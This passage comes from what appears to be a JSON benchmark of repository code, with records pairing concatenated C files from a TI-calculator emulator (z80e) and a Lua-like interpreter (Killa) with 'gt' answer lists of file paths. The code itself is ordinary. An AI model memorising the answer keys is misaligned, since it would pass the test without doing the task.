write_unimplemented_port };\n\t\tasic->cpu->devices[i] = device;\n\t}\n\n\tasic->cpu->devices[0x01] = init_keyboard();\n\tasic->cpu->devices[0x02] = init_status(asic);\n\tasic->cpu->devices[0x03] = init_interrupts(asic, &asic->interrupts);\n\tsetup_lcd_display(asic, asic->hook);\n\n\tif (asic->device != TI73 && asic->device != TI83p) {\n\t\tasic->cpu->devices[0x20] = init_speed(asic);\n\t\tinit_crystal_timers(asic);\n\t}\n\n\tinit_link_ports(asic);\n\tinit_mapping_ports(asic);\n\tinit_flash_ports(asic);\n}\n\nvoid asic_null_write(void *ignored, uint8_t value) {}\n\nvoid asic_mirror_ports(asic_t *asic) {\n\tint i;\n\tswitch (asic->device) {\n\tcase TI83p:\n\t\tfor (i = 0x08; i < 0x10; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tasic->cpu->devices[0x12] = asic->cpu->devices[0x10];\n\t\tasic->cpu->devices[0x13] = asic->cpu->devices[0x11];\n\t\tasic->cpu->devices[0x15] = asic->cpu->devices[0x05];\n\t\tasic->cpu->devices[0x15].write_out = asic_null_write;\n\t\tfor (i = 0x17; i < 0x100; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor (i = 0x60; i < 0x80; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i - 0x20];\n\t\t}\n\t\tbreak;\n\t}\n}\n\nvoid free_devices(asic_t *asic) {\n\n\tfree_keyboard(asic->cpu->devices[0x01].device);\n\tfree_status(asic->cpu->devices[0x02]);\n\tfree_mapping_ports(asic);\n}\n\nasic_t *asic_init(ti_device_type type, log_t *log) {\n\tasic_t* device = calloc(1, sizeof(asic_t));\n\tdevice->log = log;\n\tdevice->cpu = cpu_init(log);\n\tdevice->mmu = ti_mmu_init(type, log);\n\tdevice->cpu->memory = (void*)device->mmu;\n\tdevice->cpu->read_byte = ti_read_byte;\n\tdevice->cpu->write_byte = ti_write_byte;\n\tdevice->battery = BATTERIES_GOOD;\n\tdevice->device = type;\n\tdevice->clock_rate = 6000000;\n\n\tdevice->timers = calloc(1, sizeof(z80_hardware_timers_t));\n\tdevice->timers->max_timers = 20;\n\tdevice->timers->timers = calloc(20, sizeof(z80_hardware_timer_t));\n\n\tdevice->stopped = 0;\n\tdevice->debugger = 0;\n\tdevice->runloop = runloop_init(device);\n\tdevice->hook = create_hook_set(device);\n\n\tdevice->link = calloc(1, sizeof(z80_link_socket_t));\n\n\tplug_devices(device);\n\tasic_mirror_ports(device);\n\treturn device;\n}\n\nvoid asic_free(asic_t* device) {\n\tti_mmu_free(device->mmu);\n\tfree_devices(device);\n\tcpu_free(device->cpu);\n\tfree(device);\n}\n\nint asic_add_timer(asic_t *asic, int flags, double frequency, timer_tick tick, void *data) {\n\tz80_hardware_timer_t *timer = 0;\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tif (!(asic->timers->timers[i].flags & TIMER_IN_USE)) {\n\t\t\ttimer = &asic->timers->timers[i];\n\t\t\tbreak;\n\t\t}\n\n\t\tif (i == asic->timers->max_timers - 1) {\n\t\t\tasic->timers->max_timers += 10;\n\t\t\tasic->timers->timers = realloc(asic->timers->timers, sizeof(z80_hardware_timer_t) * asic->timers->max_timers);\n\t\t\tz80_hardware_timer_t *ne = &asic->timers->timers[asic->timers->max_timers - 10];\n\t\t\tmemset(ne, 0, sizeof(z80_hardware_timer_t) * 10);\n\t\t}\n\t}\n\n\ttimer->cycles_until_tick = asic->clock_rate / frequency;\n\ttimer->flags = flags | TIMER_IN_USE;\n\ttimer->frequency = frequency;\n\ttimer->on_tick = tick;\n\ttimer->data = data;\n\treturn i;\n}\n\nvoid asic_remove_timer(asic_t *asic, int index) {\n\tasic->timers->timers[index].flags &= ~TIMER_IN_USE;\n}\n\nint asic_set_clock_rate(asic_t *asic, int new_rate) {\n\tint old_rate = asic->clock_rate;\n\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tz80_hardware_timer_t *timer = &asic->timers->timers[i];\n\t\tif (timer->flags & TIMER_IN_USE) {\n\t\t\ttimer->cycles_until_tick =\n\t\t\t\tnew_rate / (timer->cycles_until_tick * timer->frequency);\n\t\t}\n\t}\n\n\tasic->clock_rate = new_rate;\n\treturn old_rate;\n}\n",
        "gt": [
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/include/z80e/core/cpu.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/src/ti/asic.c'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'"
        ],
        "content": "'z80e/libz80e/include/z80e/ti/asic.h'\n:#ifndef ASIC_H\n#define ASIC_H\n\n#include <stdint.h>\n#ifndef NOLINK\n#include <poll.h>\n#endif\n\ntypedef struct asic asic_t;\n\n#include <z80e/core/cpu.h>\n#include <z80e/log/log.h>\n#include <z80e/ti/memory.h>\n#include <z80e/ti/ti.h>\n#include <z80e/runloop/runloop.h>\n#include <z80e/debugger/hooks.h>\n#include <z80e/debugger/debugger.h>\n#include <z80e/ti/hardware/interrupts.h>\n\ntypedef enum {\n\tBATTERIES_REMOVED,\n\tBATTERIES_LOW,\n\tBATTERIES_GOOD\n} battery_state;\n\n\ntypedef void (*timer_tick)(asic_t *, void *);\ntypedef struct z80_hardware_timers z80_hardware_timers_t;\ntypedef struct z80_hardware_timer z80_hardware_timer_t;\ntypedef struct z80_link_socket z80_link_socket_t;\n\nenum {\n\tTIMER_IN_USE = (1 << 0),\n\tTIMER_ONE_SHOT = (1 << 1)\n};\n\nstruct z80_hardware_timer {\n\tint cycles_until_tick;\n\n\tint flags;\n\tdouble frequency;\n\ttimer_tick on_tick;\n\tvoid *data;\n};\n\nstruct z80_hardware_timers {\n\tint max_timers;\n\tz80_hardware_timer_t *timers;\n};\n\nstruct z80_link_socket {\n#ifndef NOLINK\n\tint accept;\n\tstruct pollfd listenfd;\n\tstruct pollfd clients[10];\n#endif\n};\n\nstruct asic {\n\tint stopped;\n\tti_device_type device;\n\tbattery_state battery;\n\tint battery_remove_check;\n\tint clock_rate;\n\n\tz80cpu_t* cpu;\n\trunloop_state_t *runloop;\n\tti_mmu_t* mmu;\n\tti_interrupts_t *interrupts;\n\tz80_hardware_timers_t *timers;\n\tz80_link_socket_t *link;\n\thook_info_t *hook;\n\tlog_t *log;\n\tdebugger_t *debugger;\n};\n\nasic_t* asic_init(ti_device_type, log_t *);\nvoid asic_free(asic_t*);\n\nint asic_set_clock_rate(asic_t *, int);\n\nint asic_add_timer(asic_t *, int, double, timer_tick, void *);\nvoid asic_remove_timer(asic_t *, int);\n\n#endif\n\n'z80e/libz80e/include/z80e/debugger/hooks.h'\n:#ifndef DEBUGGER_HOOKS_H\n#define DEBUGGER_HOOKS_H\n\n#include <stdint.h>\n\ntypedef struct hook_info hook_info_t;\n\n#include <z80e/ti/asic.h>\n#include <z80e/core/registers.h>\n#include <z80e/ti/hardware/t6a04.h>\n\nhook_info_t *create_hook_set(asic_t *asic);\n\n\n\nuint8_t hook_on_memory_read(hook_info_t *, uint16_t address, uint8_t value);\nuint8_t hook_on_memory_write(hook_info_t *, uint16_t address, uint8_t value);\n\ntypedef uint8_t (*hook_memory_callback)(void *data, uint16_t address, uint8_t value);\n\nvoid hook_remove_memory_read(hook_info_t *, int);\nint hook_add_memory_read(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_memory_write(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\n\n\n\nuint16_t hook_on_register_read(hook_info_t *, registers flags, uint16_t value);\nuint16_t hook_on_register_write(hook_info_t *, registers flags, uint16_t value);\n\ntypedef uint16_t (*hook_register_callback)(void *data, registers reg, uint16_t value);\n\nvoid hook_remove_register_read(hook_info_t *, int);\nint hook_add_register_read(hook_info_t *, registers flags, void *data, hook_register_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_register_write(hook_info_t *, registers flags, void *data, hook_register_callback);\n\n\n\nuint8_t hook_on_port_in(hook_info_t *, uint8_t port, uint8_t value);\nuint8_t hook_on_port_out(hook_info_t *, uint8_t port, uint8_t value);\n\ntypedef uint8_t (*hook_port_callback)(void *data, uint8_t port, uint8_t value);\n\nvoid hook_remove_port_in(hook_info_t *, int);\nint hook_add_port_in(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\nvoid hook_remove_port_out(hook_info_t *, int);\nint hook_add_port_out(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\n\n\n\nvoid hook_on_before_execution(hook_info_t *, uint16_t address);\nvoid hook_on_after_execution(hook_info_t *, uint16_t address);\n\ntypedef void (*hook_execution_callback)(void *data, uint16_t address);\n\nvoid hook_remove_before_execution(hook_info_t *, int);\nint hook_add_before_execution(hook_info_t *, void *data, hook_execution_callback);\nvoid hook_remove_after_execution(hook_info_t *, int);\nint hook_add_after_execution(hook_info_t *, void *data, hook_execution_callback);\n\n\n\nvoid hook_on_lcd_update(hook_info_t *, ti_bw_lcd_t *);\n\ntypedef void (*hook_lcd_update_callback)(void *data, ti_bw_lcd_t *lcd);\n\nvoid hook_remove_lcd_update(hook_info_t *, int);\nint hook_add_lcd_update(hook_info_t *, void *data, hook_lcd_update_callback);\n\n#endif\n\n'z80e/libz80e/src/ti/asic.c'\n:#include \"ti/asic.h\"\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"log/log.h\"\n#include \"core/cpu.h\"\n#include \"ti/memory.h\"\n#include \"ti/hardware/t6a04.h\"\n#include \"ti/hardware/speed.h\"\n#include \"ti/hardware/memorymapping.h\"\n#include \"ti/hardware/keyboard.h\"\n#include \"ti/hardware/status.h\"\n#include \"ti/hardware/flash.h\"\n#include \"ti/hardware/link.h\"\n#include \"ti/hardware/timers.h\"\n\ntypedef struct {\n\tasic_t *asic;\n\tuint8_t port;\n} unimplemented_device_t;\n\nuint8_t read_unimplemented_port(void *device) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to read from unimplemented port 0x%02x from 0x%04X.\", d->port, d->asic->cpu->registers.PC);\n\treturn 0x00;\n}\n\nvoid write_unimplemented_port(void *device, uint8_t value) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to write 0x%02x to unimplemented port 0x%02x from 0x%04X.\", value, d->port, d->asic->cpu->registers.PC);\n}\n\nvoid plug_devices(asic_t *asic) {\n\n\tint i;\n\tfor (i = 0; i < 0x100; i++) {\n\t\tunimplemented_device_t *d = malloc(sizeof(unimplemented_device_t));\n\t\td->asic = asic;\n\t\td->port = i;\n\t\tz80iodevice_t device = { d, read_unimplemented_port, write_unimplemented_port };\n\t\tasic->cpu->devices[i] = device;\n\t}\n\n\tasic->cpu->devices[0x01] = init_keyboard();\n\tasic->cpu->devices[0x02] = init_status(asic);\n\tasic->cpu->devices[0x03] = init_interrupts(asic, &asic->interrupts);\n\tsetup_lcd_display(asic, asic->hook);\n\n\tif (asic->device != TI73 && asic->device != TI83p) {\n\t\tasic->cpu->devices[0x20] = init_speed(asic);\n\t\tinit_crystal_timers(asic);\n\t}\n\n\tinit_link_ports(asic);\n\tinit_mapping_ports(asic);\n\tinit_flash_ports(asic);\n}\n\nvoid asic_null_write(void *ignored, uint8_t value) {}\n\nvoid asic_mirror_ports(asic_t *asic) {\n\tint i;\n\tswitch (asic->device) {\n\tcase TI83p:\n\t\tfor (i = 0x08; i < 0x10; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tasic->cpu->devices[0x12] = asic->cpu->devices[0x10];\n\t\tasic->cpu->devices[0x13] = asic->cpu->devices[0x11];\n\t\tasic->cpu->devices[0x15] = asic->cpu->devices[0x05];\n\t\tasic->cpu->devices[0x15].write_out = asic_null_write;\n\t\tfor (i = 0x17; i < 0x100; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i & 0x07];\n\t\t\tasic->cpu->devices[i].write_out = asic_null_write;\n\t\t}\n\t\tbreak;\n\tdefault:\n\t\tfor (i = 0x60; i < 0x80; i++) {\n\t\t\tasic->cpu->devices[i] = asic->cpu->devices[i - 0x20];\n\t\t}\n\t\tbreak;\n\t}\n}\n\nvoid free_devices(asic_t *asic) {\n\n\tfree_keyboard(asic->cpu->devices[0x01].device);\n\tfree_status(asic->cpu->devices[0x02]);\n\tfree_mapping_ports(asic);\n}\n\nasic_t *asic_init(ti_device_type type, log_t *log) {\n\tasic_t* device = calloc(1, sizeof(asic_t));\n\tdevice->log = log;\n\tdevice->cpu = cpu_init(log);\n\tdevice->mmu = ti_mmu_init(type, log);\n\tdevice->cpu->memory = (void*)device->mmu;\n\tdevice->cpu->read_byte = ti_read_byte;\n\tdevice->cpu->write_byte = ti_write_byte;\n\tdevice->battery = BATTERIES_GOOD;\n\tdevice->device = type;\n\tdevice->clock_rate = 6000000;\n\n\tdevice->timers = calloc(1, sizeof(z80_hardware_timers_t));\n\tdevice->timers->max_timers = 20;\n\tdevice->timers->timers = calloc(20, sizeof(z80_hardware_timer_t));\n\n\tdevice->stopped = 0;\n\tdevice->debugger = 0;\n\tdevice->runloop = runloop_init(device);\n\tdevice->hook = create_hook_set(device);\n\n\tdevice->link = calloc(1, sizeof(z80_link_socket_t));\n\n\tplug_devices(device);\n\tasic_mirror_ports(device);\n\treturn device;\n}\n\nvoid asic_free(asic_t* device) {\n\tti_mmu_free(device->mmu);\n\tfree_devices(device);\n\tcpu_free(device->cpu);\n\tfree(device);\n}\n\nint asic_add_timer(asic_t *asic, int flags, double frequency, timer_tick tick, void *data) {\n\tz80_hardware_timer_t *timer = 0;\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tif (!(asic->timers->timers[i].flags & TIMER_IN_USE)) {\n\t\t\ttimer = &asic->timers->timers[i];\n\t\t\tbreak;\n\t\t}\n\n\t\tif (i == asic->timers->max_timers - 1) {\n\t\t\tasic->timers->max_timers += 10;\n\t\t\tasic->timers->timers = realloc(asic->timers->timers, sizeof(z80_hardware_timer_t) * asic->timers->max_timers);\n\t\t\tz80_hardware_timer_t *ne = &asic->timers->timers[asic->timers->max_timers - 10];\n\t\t\tmemset(ne, 0, sizeof(z80_hardware_timer_t) * 10);\n\t\t}\n\t}\n\n\ttimer->cycles_until_tick = asic->clock_rate / frequency;\n\ttimer->flags = flags | TIMER_IN_USE;\n\ttimer->frequency = frequency;\n\ttimer->on_tick = tick;\n\ttimer->data = data;\n\treturn i;\n}\n\nvoid asic_remove_timer(asic_t *asic, int index) {\n\tasic->timers->timers[index].flags &= ~TIMER_IN_USE;\n}\n\nint asic_set_clock_rate(asic_t *asic, int new_rate) {\n\tint old_rate = asic->clock_rate;\n\n\tint i;\n\tfor (i = 0; i < asic->timers->max_timers; i++) {\n\t\tz80_hardware_timer_t *timer = &asic->timers->timers[i];\n\t\tif (timer->flags & TIMER_IN_USE) {\n\t\t\ttimer->cycles_until_tick =\n\t\t\t\tnew_rate / (timer->cycles_until_tick * timer->frequency);\n\t\t}\n\t}\n\n\tasic->clock_rate = new_rate;\n\treturn old_rate;\n}\n\n'z80e/libz80e/include/z80e/ti/hardware/link.h'\n:#ifndef LINK_H\n#define LINK_H\n\n#include <z80e/ti/asic.h>\n#include <stdbool.h>\n\ntypedef struct {\n\tasic_t *asic;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} them;\n\tstruct {\n\t\tuint8_t tip\t\t: 1;\n\t\tuint8_t ring\t: 1;\n\t} us;\n\tunion {\n\t\tuint8_t mask;\n\t\tstruct {\n\t\t\tuint8_t rx\t\t\t: 1;\n\t\t\tuint8_t tx\t\t\t: 1;\n\t\t\tuint8_t error\t\t: 1;\n\t\t\tuint8_t \t\t\t: 4;\n\t\t\tuint8_t disabled\t: 1;\n\t\t};\n\t} interrupts;\n\tstruct {\n\t\tuint8_t rx_buffer;\n\t\tuint8_t tx_buffer;\n\t\tunion {\n\t\t\tstruct {\n\t\t\t\tuint8_t int_rx_ready\t: 1;\n\t\t\t\tuint8_t int_tx_ready\t: 1;\n\t\t\t\tuint8_t int_error\t\t: 1;\n\t\t\t\tuint8_t rx_active\t\t: 1;\n\t\t\t\tuint8_t rx_ready\t\t: 1;\n\t\t\t\tuint8_t tx_ready\t\t: 1;\n\t\t\t\tuint8_t error\t\t\t: 1;\n\t\t\t\tuint8_t tx_active\t\t: 1;\n\t\t\t};\n\t\t\tuint8_t u8;\n\t\t} status;\n\t} assist;\n\tbool la_ready;\n} link_state_t;\n\nvoid init_link_ports(asic_t *asic);\nvoid free_link_ports(asic_t *asic);\n\nbool link_recv_byte(asic_t *asic, uint8_t val);\n\nint link_read_tx_buffer(asic_t *asic);\n\nbool link_recv_ready(asic_t *asic);\n\n#endif\n",
        "gt": [
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/include/z80e/ti/asic.h'",
            "'z80e/libz80e/include/z80e/ti/hardware/link.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ]
    },
    {
        "files": [
            "'Killa/src/klimits.h'",
            "'Killa/src/kapi.h'",
            "'Killa/src/kstate.c'"
        ],
        "content": "'Killa/src/klimits.h'\n:\n\n\n\n\n\n\n\n\n#ifndef KLIMITS_H_\n#define KLIMITS_H_\n\n\n#include <limits.h>\n#include <stddef.h>\n\n\n#include \"killa.h\"\n\n\ntypedef unsigned KILLA_INT32 killa_uint32;\n\ntypedef KILLAI_UMEM killa_umem;\n\ntypedef KILLAI_MEM killa_mem;\n\n\n\n\ntypedef unsigned char killa_ubyte;\n\n\n#define KILLA_MAX_SIZET\t((size_t)(~(size_t)0)-2)\n\n#define KILLA_MAX_LUMEM\t((killa_umem)(~(killa_umem)0)-2)\n\n\n#define KILLA_MAX_INT (INT_MAX-2)\n\n\n#define killa_IntPoint(p)  ((unsigned int)(killa_umem)(p))\n\n\n\n\n#if !defined(KILLAI_USER_ALIGNMENT_T)\n#define KILLAI_USER_ALIGNMENT_T\tunion { double u; void *s; long l; }\n#endif\n\ntypedef KILLAI_USER_ALIGNMENT_T killa_Umaxalign;\n\n\n\ntypedef KILLAI_UACNUMBER killa_uacNumber;\n\n\n\n#if defined(killa_assert)\n#define killa_check_exp(c,e)    (killa_assert(c), (e))\n\n#define killa_longassert(c)\t{ if (!(c)) killa_assert(0); }\n#else\n#define killa_assert(c)         ((void)0)\n#define killa_check_exp(c,e)    (e)\n#define killa_longassert(c)     ((void)0)\n#endif\n\n\n#if !defined(killai_apicheck)\n\n#if defined(KILLA_USE_APICHECK)\n#include <assert.h>\n#define killai_apicheck(L,e)    assert(e)\n#else\n#define killai_apicheck(L,e)    killa_assert(e)\n#endif\n\n#endif\n\n#define killa_api_check(l,e,msg)    killai_apicheck(l,(e) && msg)\n\n\n#if !defined(KILLA_UNUSED)\n#define KILLA_UNUSED(x) ((void)(x))\n#endif\n\n\n#define killa_cast(t, exp)  ((t)(exp))\n\n#define killa_cast_byte(i)\tkilla_cast(killa_ubyte, (i))\n#define killa_cast_num(i)\tkilla_cast(killa_Number, (i))\n#define killa_cast_int(i)\tkilla_cast(int, (i))\n#define killa_cast_uchar(i)\tkilla_cast(unsigned char, (i))\n\n\n\n#if defined(__GNUC__)\n#define killa_noret\t\tvoid __attribute__((noreturn))\n#elif defined(_MSC_VER)\n#define killa_noret\t\tvoid __declspec(noreturn)\n#else\n#define killa_noret\t\tvoid\n#endif\n\n\n\n\n#if !defined(KILLAI_MAXCCALLS)\n#define KILLAI_MAXCCALLS    200\n#endif\n\n\n#define KILLA_MAXUPVAL  UCHAR_MAX\n\n\n\ntypedef killa_uint32 killa_Instruction;\n\n\n\n\n#define KILLA_MAXSTACK  250\n\n\n\n\n#if !defined(KILLA_MINSTRTABSIZE)\n#define KILLA_MINSTRTABSIZE\t32\n#endif\n\n\n\n#if !defined(KILLA_MINBUFFER)\n#define KILLA_MINBUFFER\t32\n#endif\n\n\n#if !defined(killa_lock)\n#define killa_lock(L)   ((void) 0)\n#define killa_unlock(L) ((void) 0)\n#endif\n\n#if !defined(killai_threadyield)\n#define killai_threadyield(L)   {killa_unlock(L); killa_lock(L);}\n#endif\n\n\n\n#if !defined(killai_userstateopen)\n#define killai_userstateopen(L)         ((void)L)\n#endif\n\n#if !defined(killai_userstateclose)\n#define killai_userstateclose(L)        ((void)L)\n#endif\n\n#if !defined(killai_userstatethread)\n#define killai_userstatethread(L,L1)    ((void)L)\n#endif\n\n#if !defined(killai_userstatefree)\n#define killai_userstatefree(L,L1)      ((void)L)\n#endif\n\n#if !defined(killai_userstateresume)\n#define killai_userstateresume(L,n)     ((void)L)\n#endif\n\n#if !defined(killai_userstateyield)\n#define killai_userstateyield(L,n)      ((void)L)\n#endif\n\n\n\n#if defined(KILLA_MS_ASMTRICK)\n\n\n#define killa_number2int(i,n)  __asm {__asm fld n   __asm fistp i}\n#define killa_number2integer(i,n)\t\tkilla_number2int(i, n)\n#define killa_number2unsigned(i,n)  \\\n  {__int64 l; __asm {__asm fld n   __asm fistp l} i = (unsigned int)l;}\n\n\n#elif defined(KILLA_IEEE754TRICK)\n\n\nunion killai_Cast { double l_d; KILLA_INT32 l_p[2]; };\n\n#if !defined(KILLA_IEEEENDIAN)\n#define KILLAI_EXTRAIEEE\t\\\n  static const union killai_Cast ieeeendian = {-(33.0 + 6755399441055744.0)};\n#define KILLA_IEEEENDIAN\t\t(ieeeendian.l_p[1] == 33)\n#else\n#define KILLAI_EXTRAIEEE\n#endif\n\n#define killa_number2int32(i,n,t) \\\n  { KILLAI_EXTRAIEEE \\\n    volatile union killai_Cast u; u.l_d = (n) + 6755399441055744.0; \\\n    (i) = (t)u.l_p[KILLA_IEEEENDIAN]; }\n\n#define killai_hashnum(i,n)  \\\n  { volatile union killai_Cast u; u.l_d = (n) + 1.0;   \\\n    (i) = u.l_p[0]; (i) += u.l_p[1]; }\n\n#define killa_number2int(i,n)       killa_number2int32(i, n, int)\n#define killa_number2integer(i,n)   killa_number2int32(i, n, killa_Integer)\n#define killa_number2unsigned(i,n)  killa_number2int32(i, n, killa_Unsigned)\n\n#endif\n\n\n\n\n#if !defined(killa_number2int)\n#define killa_number2int(i,n)\t((i)=(int)(n))\n#endif\n\n#if !defined(killa_number2integer)\n#define killa_number2integer(i,n)\t((i)=(killa_Integer)(n))\n#endif\n\n#if !defined(killa_number2unsigned)\n\n#if defined(KILLA_NUMBER_DOUBLE)\n#include <math.h>\n#define KILLA_SUPUNSIGNED\t((killa_Number)(~(killa_Unsigned)0) + 1)\n#define killa_number2unsigned(i,n)  \\\n\t((i)=(killa_Unsigned)((n) - floor((n)/KILLA_SUPUNSIGNED)*KILLA_SUPUNSIGNED))\n#else\n#define killa_number2unsigned(i,n)\t((i)=(killa_Unsigned)(n))\n#endif\n#endif\n\n\n#if !defined(killa_unsigned2number)\n\n#define killa_unsigned2number(u)  \\\n    (((u) <= (killa_Unsigned)INT_MAX) ? (killa_Number)(int)(u) : (killa_Number)(u))\n#endif\n\n\n\n#if defined(KTABLE_C_) && !defined(killai_hashnum)\n\n#include <float.h>\n#include <math.h>\n\n#define killai_hashnum(i,n) { int e;  \\\n  n = frexp(n, &e) * (killa_Number)(INT_MAX - DBL_MAX_EXP);  \\\n  killa_number2int(i, n); i += e; }\n\n#endif\n\n\n\n\n#if !defined(KILLA_HARDSTACKTESTS)\n#define killa_condmovestack(L)\t((void)0)\n#else\n\n#define killa_condmovestack(L)\tkillaD_reallocstack((L), (L)->stacksize)\n#endif\n\n#if !defined(KILLA_HARDMEMTESTS)\n#define killa_condchangemem(L)\tkilla_condmovestack(L)\n#else\n#define killa_condchangemem(L)  \\\n\t((void)(!(KILLA_G(L)->gcrunning) || (killaC_fullgc(L, 0), 1)))\n#endif\n\n#endif\n\n'Killa/src/kapi.h'\n:\n\n\n\n\n\n\n\n\n#ifndef KAPI_H_\n#define KAPI_H_\n\n\n#include \"klimits.h\"\n#include \"kstate.h\"\n\n#define killaA_incr_top(L)   {L->top++; killa_api_check(L, L->top <= L->ci->top, \\\n\t\t\t\t\"stack overflow\");}\n\n#define killaA_adjustresults(L,nres) \\\n    { if ((nres) == KILLA_MULTRET && L->ci->top < L->top) L->ci->top = L->top; }\n\n#define killaA_checknelems(L,n)\tkilla_api_check(L, (n) < (L->top - L->ci->func), \\\n\t\t\t\t  \"not enough elements in the stack\")\n\n\n#endif\n\n'Killa/src/kstate.c'\n:\n\n\n\n\n\n\n\n\n#include <stddef.h>\n\n#define KILLA_CORE\n\n#include \"killa.h\"\n\n#include \"kapi.h\"\n#include \"kdebug.h\"\n#include \"kdo.h\"\n#include \"kfunc.h\"\n#include \"kgc.h\"\n#include \"klex.h\"\n#include \"kmem.h\"\n#include \"kstate.h\"\n#include \"kstring.h\"\n#include \"ktable.h\"\n#include \"ktm.h\"\n\n\n#if !defined(KILLAI_GCPAUSE)\n#define KILLAI_GCPAUSE\t200\n#endif\n\n#if !defined(KILLAI_GCMAJOR)\n#define KILLAI_GCMAJOR\t200\n#endif\n\n#if !defined(KILLAI_GCMUL)\n#define KILLAI_GCMUL\t200\n#endif\n\n\n#define MEMERRMSG       \"not enough memory\"\n\n\n\ntypedef struct LX {\n#if defined(KILLAI_EXTRASPACE)\n  char buff[KILLAI_EXTRASPACE];\n#endif\n  killa_State l;\n} LX;\n\n\n\ntypedef struct LG {\n  LX l;\n  killa_GlobalState g;\n} LG;\n\n\n\n#define fromstate(L)\t(killa_cast(LX *, killa_cast(killa_ubyte *, (L)) - offsetof(LX, l)))\n\n\n\nvoid killaE_setdebt (killa_GlobalState *g, killa_mem debt) {\n  g->totalbytes -= (debt - g->GCdebt);\n  g->GCdebt = debt;\n}\n\n\nkilla_CallInfo *killaE_extendCI (killa_State *L) {\n  killa_CallInfo *ci = killaM_new(L, killa_CallInfo);\n  killa_assert(L->ci->next == NULL);\n  L->ci->next = ci;\n  ci->previous = L->ci;\n  ci->next = NULL;\n  return ci;\n}\n\n\nvoid killaE_freeCI (killa_State *L) {\n  killa_CallInfo *ci = L->ci;\n  killa_CallInfo *next = ci->next;\n  ci->next = NULL;\n  while ((ci = next) != NULL) {\n    next = ci->next;\n    killaM_free(L, ci);\n  }\n}\n\n\nstatic void stack_init (killa_State *L1, killa_State *L) {\n  int i; killa_CallInfo *ci;\n\n  L1->stack = killaM_newvector(L, KILLA_BASIC_STACK_SIZE, killa_TValue);\n  L1->stacksize = KILLA_BASIC_STACK_SIZE;\n  for (i = 0; i < KILLA_BASIC_STACK_SIZE; i++)\n    killa_setnilvalue(L1->stack + i);\n  L1->top = L1->stack;\n  L1->stack_last = L1->stack + L1->stacksize - KILLA_EXTRA_STACK;\n\n  ci = &L1->base_ci;\n  ci->next = ci->previous = NULL;\n  ci->callstatus = 0;\n  ci->func = L1->top;\n  killa_setnilvalue(L1->top++);\n  ci->top = L1->top + KILLA_MINSTACK;\n  L1->ci = ci;\n}\n\n\nstatic void freestack (killa_State *L) {\n  if (L->stack == NULL)\n    return;\n  L->ci = &L->base_ci;\n  killaE_freeCI(L);\n  killaM_freearray(L, L->stack, L->stacksize);\n}\n\n\n\nstatic void init_registry (killa_State *L, killa_GlobalState *g) {\n  killa_TValue mt;\n\n  killa_Table *registry = killaH_new(L);\n  killa_sethvalue(L, &g->l_registry, registry);\n  killaH_resize(L, registry, KILLA_RIDX_SIZE, 0);\n\n  killa_setthvalue(L, &mt, L);\n  killaH_setint(L, registry, KILLA_RIDX_MAINTHREAD, &mt);\n\n  killa_sethvalue(L, &mt, killaH_new(L));\n  killaH_setint(L, registry, KILLA_RIDX_GLOBALS, &mt);\n}\n\n\n\nstatic void f_killaopen (killa_State *L, void *ud) {\n  killa_GlobalState *g = KILLA_G(L);\n  KILLA_UNUSED(ud);\n  stack_init(L, L);\n  init_registry(L, g);\n  killaS_resize(L, KILLA_MINSTRTABSIZE);\n  killaT_init(L);\n  killaX_init(L);\n\n  g->memerrmsg = killaS_newliteral(L, MEMERRMSG);\n  killaS_fix(g->memerrmsg);\n  g->gcrunning = 1;\n}\n\n\n\nstatic void preinit_state (killa_State *L, killa_GlobalState *g) {\n  KILLA_G(L) = g;\n  L->stack = NULL;\n  L->ci = NULL;\n  L->stacksize = 0;\n  L->errorJmp = NULL;\n  L->nCcalls = 0;\n  L->hook = NULL;\n  L->hookmask = 0;\n  L->basehookcount = 0;\n  L->allowhook = 1;\n  killa_resethookcount(L);\n  L->openupval = NULL;\n  L->nny = 1;\n  L->status = KILLA_OK;\n  L->errfunc = 0;\n}\n\n\nstatic void close_state (killa_State *L) {\n  killa_GlobalState *g = KILLA_G(L);\n  killaF_close(L, L->stack);\n  killaC_freeallobjects(L);\n  killaM_freearray(L, KILLA_G(L)->strt.hash, KILLA_G(L)->strt.size);\n  killaZ_freebuffer(L, &g->buff);\n  freestack(L);\n  killa_assert(killa_gettotalbytes(g) == sizeof(LG));\n  (*g->frealloc)(g->ud, fromstate(L), sizeof(LG), 0);\n}\n\n\nKILLA_API killa_State *killa_newthread (killa_State *L) 